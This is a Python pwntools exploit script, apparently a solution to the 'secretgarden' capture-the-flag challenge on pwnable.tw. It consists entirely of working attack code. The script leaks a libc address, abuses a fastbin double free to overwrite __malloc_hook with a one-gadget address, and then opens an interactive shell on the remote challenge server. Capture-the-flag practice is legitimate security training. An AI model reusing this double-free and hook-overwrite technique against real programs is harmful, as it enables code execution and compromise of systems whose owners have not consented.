#double free
from pwn import *

context.log_level = 'debug'
prog = './secretgarden'
elf = ELF(prog)
p = process(prog)

libc = ELF("libc_64.so.6")#/lib/x86_64-linux-gnu/libc-2.23.so")
p = remote('chall.pwnable.tw', 10203)
def dbg(b= ''):
    gdb.attach(p, b)
    if b == '':
    	p.interactive()
def add(size, content):
	p.sendlineafter("choice : ", '1')
	p.sendlineafter("name :", str(size))
	p.sendafter("The name of flower :", content)
	p.sendlineafter("The color of the flower :", 'a')
def show():
	p.sendlineafter("choice : ", '2')
def free(idx):
	p.sendlineafter("choice : ", '3')
	p.sendlineafter("garden:", str(idx))
def exp():
	#dbg('b*0x80486f8')
	add(0x80, 'a')#0
	add(0x60, 'a')#1
	add(0x60, 'a')#2
	free(0)
	add(0x50, 'a'*8)
	show()
	libc.address = u64(p.recvuntil("\x7f")[-6:]+'\x00'*2)- 0x3c3b20 - 88 
	log.info("libc.address ==> " + hex(libc.address))
	free(1)
	free(2)
	free(1)
	add(0x60, p64(libc.sym['__malloc_hook']-0x23))
	add(0x60, 'a')
	add(0x60, 'a')
	add(0x60, '\x00'*(3+0x10)+p64(libc.address + 0xef6c4))
	free(0)
	free(0)
	#dbg()
	p.interactive()
if __name__ == '__main__':
	exp()
